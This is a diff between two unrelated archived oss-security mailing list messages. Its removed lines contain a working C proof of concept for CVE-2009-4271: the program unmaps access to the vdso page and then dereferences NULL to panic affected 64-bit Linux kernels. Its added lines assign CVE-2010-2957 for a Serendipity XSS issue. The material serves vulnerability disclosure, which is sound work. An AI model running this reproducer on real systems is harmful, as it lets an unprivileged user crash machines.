@@ -1,52 +1,37 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/03/17/8
-Message-ID: <20100317140759.GF16796@suse.de>
-Date: Wed, 17 Mar 2010 15:07:59 +0100
-From: Marcus Meissner <meissner@...e.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/08/31/5
+Message-ID: <1449401253.941441283282955256.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
+Date: Tue, 31 Aug 2010 15:29:15 -0400 (EDT)
+From: Josh Bressers <bressers@...hat.com>
 To: oss-security@...ts.openwall.com
-Cc: coley@...us.mitre.org
-Subject: Re: CVE-2009-4271 kernel: 32bit process on 64bit system DoS
+Cc: coley <coley@...re.org>
+Subject: Re: CVE request: serendipity < 1.5.4 xss
 Content-Type: text/plain; charset=utf-8
 
-On Wed, Mar 17, 2010 at 09:01:19AM +0800, Eugene Teo wrote:
-> STMicroelectronics reported a flaw in the Linux kernel, versions 2.6.9 
-> to 2.6.17, when running on x86_64, where a user could use a regular 
-> 32bit process to trigger a kernel panic, without any special privileges. 
->  The bug occurs when a 32bit user process triggers a segfault (i.e. 
-> de-reference a null-pointer) after having performed a mprotect() to 
-> restrict any rwx access on its VDSO page.
+Please use CVE-2010-2957
+
+Thanks.
+
+-- 
+    JB
+
+
+----- "Hanno Böck" <hanno@...eck.de> wrote:
+
+> http://blog.s9y.org/archives/223-Serendipity-1.5.4-released.html
 > 
-> This only affects Red Hat Enterprise Linux 4.
+> http://www.htbridge.ch/advisory/xss_vulnerability_in_serendipity.html
 > 
-> https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2009-4271
-
-Would this be a valid reproducer? :
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/mman.h>
-
-int main(){
-	FILE *f;
-	char line[256];
-	void *x,*y;
-
-	f = fopen("/proc/self/maps","r");
-	if (!f) exit(1);
-
-	x=y=NULL;
-	while (fgets(line,sizeof(line),f)) {
-		if (strstr(line,"vdso")) {
-			sscanf(line,"%p-%p ",&x,&y);
-			fprintf(stderr,"vdso %x\n", x);
-			break;
-		}
-	}
-	if (!x) exit(1);
-
-	mprotect(x,4096, PROT_NONE);
-	*(char*)NULL = NULL;
-}
-
-Ciao, Marcus
+> "as well as a XSS security issue discovered and reported by High-Tech
+> Bridge. 
+> The XSS is only exploitable though, if you are using the "Remember me"
+> feature 
+> in the Serendipity backend to login."
+> 
+> 
+> 
+> -- 
+> Hanno Böck		Blog:		http://www.hboeck.de/
+> GPG: 3DBD3B20		Jabber/Mail:	hanno@...eck.de
+> 
+> http://schokokeks.org - professional webhosting
